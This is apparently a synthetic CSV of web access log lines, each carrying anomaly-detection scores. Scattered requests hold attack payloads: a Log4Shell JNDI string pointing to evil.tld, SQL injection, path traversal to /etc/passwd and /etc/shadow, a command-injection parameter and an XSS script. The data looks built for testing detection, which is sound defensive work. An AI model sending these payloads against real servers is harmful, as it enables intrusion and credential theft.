score_content,score_session,score_fused,score_fused_norm,line
46.38753890991211,,46.38753890991211,46.38753890991211,158.159.191.104 - - [10/Jan/2025:12:14:09 +0000] "HEAD /.env HTTP/1.1" 200 11940 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.82185363769531,,47.82185363769531,47.82185363769531,25.29.234.204 - - [10/Jan/2025:12:14:09 +0000] "HEAD /login HTTP/1.1" 201 9602 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.54517936706543,,23.54517936706543,23.54517936706543,175.228.71.179 - - [10/Jan/2025:12:14:09 +0000] "GET /search?q=monitor HTTP/1.1" 200 6527 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.489367485046387,,13.489367485046387,13.489367485046387,195.81.145.199 - - [10/Jan/2025:12:14:10 +0000] "PUT /logout HTTP/1.1" 200 18439 "https://www.google.com/" "python-requests/2.31.0"
129.58287048339844,,129.58287048339844,129.58287048339844,175.91.116.168 - - [10/Jan/2025:12:14:12 +0000] "TRACE /search?q=router HTTP/1.1" 304 6493 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
69.43872833251953,,69.43872833251953,69.43872833251953,235.143.162.178 - - [10/Jan/2025:12:14:12 +0000] "HEAD /search?q=camera HTTP/1.1" 200 12994 "https://example.com/" "curl/7.85.0"
23.575359344482422,,23.575359344482422,23.575359344482422,142.183.78.44 - - [10/Jan/2025:12:14:14 +0000] "GET /search?q=camera HTTP/1.1" 200 8725 "-" "Wget/1.21.2 (linux-gnu)"
2.1729209423065186,,2.1729209423065186,2.1729209423065186,125.182.6.238 - - [10/Jan/2025:12:14:15 +0000] "GET / HTTP/1.1" 200 3547 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.435738563537598,,13.435738563537598,13.435738563537598,102.242.94.55 - - [10/Jan/2025:12:14:18 +0000] "PUT /contact HTTP/1.1" 200 12955 "https://twitter.com/" "dirb/2.22"
0.36531031131744385,,0.36531031131744385,0.36531031131744385,175.16.64.132 - - [10/Jan/2025:12:14:20 +0000] "GET /index.html HTTP/1.1" 200 19265 "-" "dirb/2.22"
49.508426666259766,,49.508426666259766,49.508426666259766,5.216.105.175 - - [10/Jan/2025:12:14:21 +0000] "DELETE /search?q=ssd HTTP/1.1" 201 19684 "-" "Wget/1.21.2 (linux-gnu)"
30145.794921875,,30145.794921875,30145.794921875,31.247.93.129 - - [10/Jan/2025:12:14:23 +0000] "PUT /search?q=router HTTP/1.1" 403 545 "https://twitter.com/" "curl/7.85.0"
98.13837432861328,,98.13837432861328,98.13837432861328,51.126.140.213 - - [10/Jan/2025:12:14:23 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 301 17272 "https://www.google.com/" "curl/7.85.0"
2.0234017372131348,,2.0234017372131348,2.0234017372131348,244.181.222.54 - - [10/Jan/2025:12:14:25 +0000] "GET /login HTTP/1.1" 200 17827 "https://twitter.com/" "dirb/2.22"
30111.056640625,,30111.056640625,30111.056640625,155.14.133.119 - - [10/Jan/2025:12:14:25 +0000] "GET /index.html HTTP/1.1" 404 107 "https://www.google.com/" "curl/7.85.0"
1.9662264585494995,,1.9662264585494995,1.9662264585494995,134.141.139.120 - - [10/Jan/2025:12:14:26 +0000] "GET /about HTTP/1.1" 200 4058 "https://www.google.com/" "curl/7.85.0"
11092.0546875,,11092.0546875,11092.0546875,114.91.215.115 - - [10/Jan/2025:12:14:28 +0000] "DELETE /search?q=headphones HTTP/1.1" 503 921 "https://www.google.com/" "python-requests/2.31.0"
26.154088973999023,,26.154088973999023,26.154088973999023,182.91.81.19 - - [10/Jan/2025:12:14:30 +0000] "DELETE /.git/config HTTP/1.1" 200 17380 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.3785629272461,,73.3785629272461,73.3785629272461,105.22.27.220 - - [10/Jan/2025:12:14:30 +0000] "OPTIONS /api/products HTTP/1.1" 200 446 "https://example.com/" "dirb/2.22"
16.241613388061523,,16.241613388061523,16.241613388061523,25.220.247.184 - - [10/Jan/2025:12:14:32 +0000] "PUT /phpmyadmin HTTP/1.1" 302 3167 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7381008863449097,,1.7381008863449097,1.7381008863449097,75.212.104.2 - - [10/Jan/2025:12:14:32 +0000] "GET /server-status HTTP/1.1" 200 7885 "-" "dirb/2.22"
30110.7734375,,30110.7734375,30110.7734375,109.168.123.136 - - [10/Jan/2025:12:14:32 +0000] "GET /index.html HTTP/1.1" 400 1372 "-" "nikto/2.5.0"
11044.65234375,,11044.65234375,11044.65234375,156.48.234.231 - - [10/Jan/2025:12:14:33 +0000] "GET / HTTP/1.1" 503 1033 "-" "nikto/2.5.0"
23.683677673339844,,23.683677673339844,23.683677673339844,13.228.173.82 - - [10/Jan/2025:12:14:34 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 2528 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.231900215148926,,2.231900215148926,2.231900215148926,154.15.88.73 - - [10/Jan/2025:12:14:36 +0000] "GET / HTTP/1.1" 200 17579 "https://www.google.com/" "nikto/2.5.0"
104.81181335449219,,104.81181335449219,104.81181335449219,68.120.186.165 - - [10/Jan/2025:12:14:38 +0000] "TRACE /dashboard HTTP/1.1" 200 2415 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.3047674894332886,,0.3047674894332886,0.3047674894332886,9.93.48.130 - - [10/Jan/2025:12:14:40 +0000] "GET /index.html HTTP/1.1" 200 4184 "https://news.ycombinator.com/" "nikto/2.5.0"
106.21923065185547,,106.21923065185547,106.21923065185547,47.232.69.44 - - [10/Jan/2025:12:14:41 +0000] "TRACE /wp-login.php HTTP/1.1" 302 5818 "https://twitter.com/" "nikto/2.5.0"
47.5714111328125,,47.5714111328125,47.5714111328125,22.113.171.92 - - [10/Jan/2025:12:14:42 +0000] "HEAD /server-status HTTP/1.1" 200 8044 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.27729037404060364,,0.27729037404060364,0.27729037404060364,16.76.157.81 - - [10/Jan/2025:12:14:45 +0000] "GET /assets/app.js HTTP/1.1" 200 16720 "https://www.google.com/" "curl/7.85.0"
49.427955627441406,,49.427955627441406,49.427955627441406,187.132.163.187 - - [10/Jan/2025:12:14:47 +0000] "DELETE /api/product?id=123 HTTP/1.1" 204 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.67059326171875,,49.67059326171875,49.67059326171875,227.163.234.86 - - [10/Jan/2025:12:14:49 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17376 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.0946273803711,,95.0946273803711,95.0946273803711,218.175.64.211 - - [10/Jan/2025:12:14:52 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 11295 "https://news.ycombinator.com/" "curl/7.85.0"
0.27892255783081055,,0.27892255783081055,0.27892255783081055,241.137.254.135 - - [10/Jan/2025:12:14:53 +0000] "GET /assets/app.js HTTP/1.1" 200 17229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
69.45604705810547,,69.45604705810547,69.45604705810547,53.97.131.188 - - [10/Jan/2025:12:14:54 +0000] "HEAD /search?q=phone HTTP/1.1" 200 11936 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.101783752441406,,35.101783752441406,35.101783752441406,161.14.93.250 - - [10/Jan/2025:12:14:54 +0000] "PUT /search?q=router HTTP/1.1" 200 11968 "-" "Wget/1.21.2 (linux-gnu)"
126.51383972167969,,126.51383972167969,126.51383972167969,9.119.66.198 - - [10/Jan/2025:12:14:56 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 6234 "-" "nikto/2.5.0"
35.082401275634766,,35.082401275634766,35.082401275634766,128.161.29.102 - - [10/Jan/2025:12:14:57 +0000] "PUT /search?q=laptop HTTP/1.1" 200 7439 "https://twitter.com/" "nikto/2.5.0"
49.4089241027832,,49.4089241027832,49.4089241027832,225.97.103.145 - - [10/Jan/2025:12:14:58 +0000] "DELETE /search?q=laptop HTTP/1.1" 201 10871 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.761600017547607,,7.761600017547607,7.761600017547607,58.92.216.171 - - [10/Jan/2025:12:15:01 +0000] "POST /logout HTTP/1.1" 302 2240 "https://twitter.com/" "sqlmap/1.7.2#stable"
69.39784240722656,,69.39784240722656,69.39784240722656,152.141.75.96 - - [10/Jan/2025:12:15:03 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 3969 "https://www.google.com/" "curl/7.85.0"
30160.099609375,,30160.099609375,30160.099609375,212.139.251.112 - - [10/Jan/2025:12:15:05 +0000] "DELETE /search?q=phone HTTP/1.1" 403 386 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
95.20569610595703,,95.20569610595703,95.20569610595703,180.116.172.87 - - [10/Jan/2025:12:15:06 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 12067 "https://www.google.com/" "sqlmap/1.7.2#stable"
29.48680877685547,,29.48680877685547,29.48680877685547,210.137.192.64 - - [10/Jan/2025:12:15:06 +0000] "POST /search?q=router HTTP/1.1" 304 14372 "-" "dirb/2.22"
38.06381607055664,,38.06381607055664,38.06381607055664,58.160.57.14 - - [10/Jan/2025:12:15:09 +0000] "PUT /search?q=phone HTTP/1.1" 302 9008 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
126.58234405517578,,126.58234405517578,126.58234405517578,11.21.249.130 - - [10/Jan/2025:12:15:12 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 6326 "https://www.google.com/" "nikto/2.5.0"
47.85638427734375,,47.85638427734375,47.85638427734375,229.156.74.32 - - [10/Jan/2025:12:15:13 +0000] "HEAD /login HTTP/1.1" 200 18725 "https://example.com/" "curl/7.85.0"
26.4815616607666,,26.4815616607666,26.4815616607666,136.86.113.91 - - [10/Jan/2025:12:15:15 +0000] "POST /search?q=router HTTP/1.1" 200 9652 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.2373969554901123,,3.2373969554901123,3.2373969554901123,88.26.37.73 - - [10/Jan/2025:12:15:15 +0000] "GET /assets/app.css HTTP/1.1" 304 18731 "https://www.google.com/" "nikto/2.5.0"
26.64030647277832,,26.64030647277832,26.64030647277832,242.245.197.1 - - [10/Jan/2025:12:15:18 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 15603 "https://twitter.com/" "dirb/2.22"
23.681825637817383,,23.681825637817383,23.681825637817383,199.83.141.2 - - [10/Jan/2025:12:15:21 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1924 "https://twitter.com/" "nikto/2.5.0"
47.54348373413086,,47.54348373413086,47.54348373413086,204.147.36.244 - - [10/Jan/2025:12:15:23 +0000] "HEAD /server-status HTTP/1.1" 200 2441 "https://www.google.com/" "dirb/2.22"
72.33003234863281,,72.33003234863281,72.33003234863281,205.167.145.242 - - [10/Jan/2025:12:15:24 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 15361 "https://example.com/" "sqlmap/1.7.2#stable"
4.821340084075928,,4.821340084075928,4.821340084075928,186.93.249.51 - - [10/Jan/2025:12:15:26 +0000] "POST /profile HTTP/1.1" 200 9356 "https://example.com/" "curl/7.85.0"
95.1604232788086,,95.1604232788086,95.1604232788086,109.119.52.242 - - [10/Jan/2025:12:15:28 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10645 "https://www.google.com/" "sqlmap/1.7.2#stable"
11077.9248046875,,11077.9248046875,11077.9248046875,64.200.233.229 - - [10/Jan/2025:12:15:28 +0000] "PUT /search?q=router HTTP/1.1" 503 175 "-" "curl/7.85.0"
126.49821472167969,,126.49821472167969,126.49821472167969,108.122.188.148 - - [10/Jan/2025:12:15:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 843 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.6847038269043,,47.6847038269043,47.6847038269043,196.121.231.72 - - [10/Jan/2025:12:15:31 +0000] "HEAD /dashboard HTTP/1.1" 200 8958 "https://twitter.com/" "curl/7.85.0"
7.764710903167725,,7.764710903167725,7.764710903167725,187.141.120.162 - - [10/Jan/2025:12:15:31 +0000] "POST /dashboard HTTP/1.1" 304 16824 "https://www.google.com/" "python-requests/2.31.0"
95.1819076538086,,95.1819076538086,95.1819076538086,114.52.206.66 - - [10/Jan/2025:12:15:34 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 16554 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
23.553186416625977,,23.553186416625977,23.553186416625977,161.83.248.77 - - [10/Jan/2025:12:15:36 +0000] "GET /search?q=laptop HTTP/1.1" 200 4226 "https://www.google.com/" "python-requests/2.31.0"
2.2119200229644775,,2.2119200229644775,2.2119200229644775,112.96.16.136 - - [10/Jan/2025:12:15:39 +0000] "GET / HTTP/1.1" 200 11867 "-" "python-requests/2.31.0"
4.82664155960083,,4.82664155960083,4.82664155960083,218.227.241.104 - - [10/Jan/2025:12:15:41 +0000] "POST /profile HTTP/1.1" 200 10598 "https://example.com/" "python-requests/2.31.0"
73.57799530029297,,73.57799530029297,73.57799530029297,103.92.64.163 - - [10/Jan/2025:12:15:41 +0000] "OPTIONS /login HTTP/1.1" 200 17411 "https://twitter.com/" "curl/7.85.0"
26.447141647338867,,26.447141647338867,26.447141647338867,197.247.180.215 - - [10/Jan/2025:12:15:43 +0000] "POST /search?q=laptop HTTP/1.1" 200 1092 "https://www.google.com/" "nikto/2.5.0"
38.06570053100586,,38.06570053100586,38.06570053100586,66.144.246.151 - - [10/Jan/2025:12:15:46 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 18248 "https://twitter.com/" "sqlmap/1.7.2#stable"
98.05809783935547,,98.05809783935547,98.05809783935547,66.95.1.220 - - [10/Jan/2025:12:15:49 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 304 3397 "-" "sqlmap/1.7.2#stable"
11.791875839233398,,11.791875839233398,11.791875839233398,148.225.84.107 - - [10/Jan/2025:12:15:50 +0000] "PUT /.git/config HTTP/1.1" 200 4936 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.928027629852295,,4.928027629852295,4.928027629852295,75.91.226.7 - - [10/Jan/2025:12:15:51 +0000] "POST /admin HTTP/1.1" 200 19027 "https://news.ycombinator.com/" "dirb/2.22"
47.82463455200195,,47.82463455200195,47.82463455200195,30.146.19.29 - - [10/Jan/2025:12:15:52 +0000] "HEAD /login HTTP/1.1" 200 9851 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
98.1529541015625,,98.1529541015625,98.1529541015625,188.90.16.212 - - [10/Jan/2025:12:15:55 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 302 19975 "-" "nikto/2.5.0"
73.46630096435547,,73.46630096435547,73.46630096435547,41.233.135.190 - - [10/Jan/2025:12:15:55 +0000] "OPTIONS /contact HTTP/1.1" 201 7415 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
45.960445404052734,,45.960445404052734,45.960445404052734,216.233.93.98 - - [10/Jan/2025:12:15:58 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 12784 "https://www.google.com/" "nikto/2.5.0"
0.22169694304466248,,0.22169694304466248,0.22169694304466248,183.230.244.92 - - [10/Jan/2025:12:16:00 +0000] "GET /assets/app.css HTTP/1.1" 200 8284 "https://news.ycombinator.com/" "dirb/2.22"
26.367023468017578,,26.367023468017578,26.367023468017578,220.247.99.28 - - [10/Jan/2025:12:16:03 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10569 "https://www.google.com/" "python-requests/2.31.0"
0.32194074988365173,,0.32194074988365173,0.32194074988365173,212.94.125.177 - - [10/Jan/2025:12:16:03 +0000] "GET /index.html HTTP/1.1" 200 348 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
4.876285076141357,,4.876285076141357,4.876285076141357,235.110.31.132 - - [10/Jan/2025:12:16:04 +0000] "GET /contact HTTP/1.1" 302 13656 "https://news.ycombinator.com/" "curl/7.85.0"
71.70846557617188,,71.70846557617188,71.70846557617188,188.151.71.85 - - [10/Jan/2025:12:16:05 +0000] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 18571 "-" "nikto/2.5.0"
98.11416625976562,,98.11416625976562,98.11416625976562,192.7.98.230 - - [10/Jan/2025:12:16:07 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 304 16563 "-" "curl/7.85.0"
49.476566314697266,,49.476566314697266,49.476566314697266,102.36.8.200 - - [10/Jan/2025:12:16:10 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 10062 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.225130081176758,,2.225130081176758,2.225130081176758,150.197.59.214 - - [10/Jan/2025:12:16:11 +0000] "GET / HTTP/1.1" 200 15506 "https://example.com/" "dirb/2.22"
23.592002868652344,,23.592002868652344,23.592002868652344,249.47.40.146 - - [10/Jan/2025:12:16:13 +0000] "GET /api/product?id=123 HTTP/1.1" 200 9784 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21653231978416443,,0.21653231978416443,0.21653231978416443,225.243.108.121 - - [10/Jan/2025:12:16:15 +0000] "GET /assets/app.css HTTP/1.1" 200 7180 "https://www.google.com/" "python-requests/2.31.0"
35.06724548339844,,35.06724548339844,35.06724548339844,241.10.124.99 - - [10/Jan/2025:12:16:16 +0000] "PUT /search?q=laptop HTTP/1.1" 200 4430 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.753582000732422,,27.753582000732422,27.753582000732422,140.110.64.39 - - [10/Jan/2025:12:16:17 +0000] "DELETE /profile HTTP/1.1" 200 15149 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
35.02993392944336,,35.02993392944336,35.02993392944336,130.192.234.120 - - [10/Jan/2025:12:16:17 +0000] "PUT /search?q=headphones HTTP/1.1" 204 12866 "-" "nikto/2.5.0"
49.53860092163086,,49.53860092163086,49.53860092163086,65.87.78.229 - - [10/Jan/2025:12:16:17 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 8151 "https://news.ycombinator.com/" "curl/7.85.0"
74.86064910888672,,74.86064910888672,74.86064910888672,114.101.214.47 - - [10/Jan/2025:12:16:20 +0000] "OPTIONS /wp-login.php HTTP/1.1" 304 15264 "https://example.com/" "python-requests/2.31.0"
0.2406461238861084,,0.2406461238861084,0.2406461238861084,137.232.97.164 - - [10/Jan/2025:12:16:22 +0000] "GET /wp-login.php HTTP/1.1" 200 1161 "https://www.google.com/" "curl/7.85.0"
76.32430267333984,,76.32430267333984,76.32430267333984,76.85.209.93 - - [10/Jan/2025:12:16:24 +0000] "OPTIONS /server-status HTTP/1.1" 304 16575 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.53447723388672,,73.53447723388672,73.53447723388672,219.184.32.239 - - [10/Jan/2025:12:16:24 +0000] "OPTIONS /logout HTTP/1.1" 200 15276 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30.783220291137695,,30.783220291137695,30.783220291137695,91.205.203.98 - - [10/Jan/2025:12:16:27 +0000] "DELETE /login HTTP/1.1" 302 18132 "-" "dirb/2.22"
30160.275390625,,30160.275390625,30160.275390625,204.200.235.38 - - [10/Jan/2025:12:16:29 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 328 "https://twitter.com/" "sqlmap/1.7.2#stable"
30110.7265625,,30110.7265625,30110.7265625,229.109.236.31 - - [10/Jan/2025:12:16:29 +0000] "GET /assets/app.js HTTP/1.1" 400 696 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30156.681640625,,30156.681640625,30156.681640625,110.54.245.58 - - [10/Jan/2025:12:16:32 +0000] "HEAD /.env HTTP/1.1" 401 1477 "https://example.com/" "nikto/2.5.0"
16.457155227661133,,16.457155227661133,16.457155227661133,168.58.209.4 - - [10/Jan/2025:12:16:32 +0000] "PUT /login HTTP/1.1" 304 4835 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30183.65625,,30183.65625,30183.65625,69.110.226.189 - - [10/Jan/2025:12:16:35 +0000] "OPTIONS /login HTTP/1.1" 403 1016 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
35.05573272705078,,35.05573272705078,35.05573272705078,196.66.48.50 - - [10/Jan/2025:12:16:35 +0000] "PUT /search?q=laptop HTTP/1.1" 200 1476 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30110.826171875,,30110.826171875,30110.826171875,184.59.194.12 - - [10/Jan/2025:12:16:36 +0000] "GET /assets/app.css HTTP/1.1" 403 862 "https://example.com/" "python-requests/2.31.0"
30123.568359375,,30123.568359375,30123.568359375,209.8.8.161 - - [10/Jan/2025:12:16:37 +0000] "PUT /phpmyadmin HTTP/1.1" 403 698 "https://www.google.com/" "sqlmap/1.7.2#stable"
47.664146423339844,,47.664146423339844,47.664146423339844,57.205.230.26 - - [10/Jan/2025:12:16:40 +0000] "HEAD /phpmyadmin HTTP/1.1" 204 12573 "https://www.google.com/" "nikto/2.5.0"
38.110294342041016,,38.110294342041016,38.110294342041016,248.209.50.252 - - [10/Jan/2025:12:16:40 +0000] "PUT /search?q=ssd HTTP/1.1" 302 8630 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.033790588378906,,35.033790588378906,35.033790588378906,234.244.43.79 - - [10/Jan/2025:12:16:41 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7588 "https://example.com/" "python-requests/2.31.0"
2.2288312911987305,,2.2288312911987305,2.2288312911987305,208.82.81.195 - - [10/Jan/2025:12:16:42 +0000] "GET / HTTP/1.1" 200 16621 "https://news.ycombinator.com/" "curl/7.85.0"
30110.857421875,,30110.857421875,30110.857421875,219.63.59.213 - - [10/Jan/2025:12:16:43 +0000] "GET /assets/app.js HTTP/1.1" 403 619 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30110.875,,30110.875,30110.875,151.70.226.45 - - [10/Jan/2025:12:16:43 +0000] "GET /assets/app.css HTTP/1.1" 404 765 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.423511505126953,,26.423511505126953,26.423511505126953,128.163.83.125 - - [10/Jan/2025:12:16:43 +0000] "GET /search?q=headphones HTTP/1.1" 302 2457 "https://twitter.com/" "python-requests/2.31.0"
3.0989344120025635,,3.0989344120025635,3.0989344120025635,214.196.68.218 - - [10/Jan/2025:12:16:46 +0000] "POST /../../etc/passwd HTTP/1.1" 200 11907 "https://www.google.com/" "curl/7.85.0"
2.183927297592163,,2.183927297592163,2.183927297592163,233.139.122.53 - - [10/Jan/2025:12:16:48 +0000] "GET / HTTP/1.1" 200 5646 "https://news.ycombinator.com/" "dirb/2.22"
27.71186637878418,,27.71186637878418,27.71186637878418,250.78.66.147 - - [10/Jan/2025:12:16:51 +0000] "DELETE /contact HTTP/1.1" 200 5303 "https://example.com/" "dirb/2.22"
95.16454315185547,,95.16454315185547,95.16454315185547,85.10.45.196 - - [10/Jan/2025:12:16:54 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 17256 "-" "curl/7.85.0"
11115.78515625,,11115.78515625,11115.78515625,34.167.13.225 - - [10/Jan/2025:12:16:56 +0000] "OPTIONS /server-status HTTP/1.1" 503 1283 "https://news.ycombinator.com/" "dirb/2.22"
13.451910018920898,,13.451910018920898,13.451910018920898,222.120.159.56 - - [10/Jan/2025:12:16:56 +0000] "PUT /profile HTTP/1.1" 200 17625 "https://www.google.com/" "dirb/2.22"
95.13585662841797,,95.13585662841797,95.13585662841797,207.213.17.245 - - [10/Jan/2025:12:16:59 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 5325 "https://news.ycombinator.com/" "python-requests/2.31.0"
30137.9921875,,30137.9921875,30137.9921875,44.30.190.199 - - [10/Jan/2025:12:17:02 +0000] "DELETE /logout HTTP/1.1" 404 824 "https://news.ycombinator.com/" "nikto/2.5.0"
49.47158432006836,,49.47158432006836,49.47158432006836,189.3.106.93 - - [10/Jan/2025:12:17:02 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 297 "https://www.google.com/" "sqlmap/1.7.2#stable"
126.56221008300781,,126.56221008300781,126.56221008300781,24.20.178.127 - - [10/Jan/2025:12:17:04 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 2207 "https://example.com/" "curl/7.85.0"
26.480379104614258,,26.480379104614258,26.480379104614258,247.46.14.175 - - [10/Jan/2025:12:17:05 +0000] "POST /search?q=camera HTTP/1.1" 200 9376 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2737109065055847,,0.2737109065055847,0.2737109065055847,230.158.27.147 - - [10/Jan/2025:12:17:08 +0000] "GET /assets/app.js HTTP/1.1" 200 15634 "-" "sqlmap/1.7.2#stable"
75.08704376220703,,75.08704376220703,75.08704376220703,114.72.134.116 - - [10/Jan/2025:12:17:09 +0000] "OPTIONS /.env HTTP/1.1" 304 7289 "https://news.ycombinator.com/" "dirb/2.22"
4.77371072769165,,4.77371072769165,4.77371072769165,8.247.117.165 - - [10/Jan/2025:12:17:10 +0000] "GET /api/products HTTP/1.1" 302 8347 "https://example.com/" "sqlmap/1.7.2#stable"
1.9006285667419434,,1.9006285667419434,1.9006285667419434,132.123.239.179 - - [10/Jan/2025:12:17:12 +0000] "GET /contact HTTP/1.1" 200 5264 "-" "Wget/1.21.2 (linux-gnu)"
4.84873628616333,,4.84873628616333,4.84873628616333,4.29.195.122 - - [10/Jan/2025:12:17:13 +0000] "POST /profile HTTP/1.1" 200 16596 "https://example.com/" "nikto/2.5.0"
47.70232009887695,,47.70232009887695,47.70232009887695,128.19.165.254 - - [10/Jan/2025:12:17:13 +0000] "HEAD /api/products HTTP/1.1" 200 18373 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.804358959197998,,4.804358959197998,4.804358959197998,14.47.161.143 - - [10/Jan/2025:12:17:15 +0000] "GET /profile HTTP/1.1" 301 2049 "https://www.google.com/" "python-requests/2.31.0"
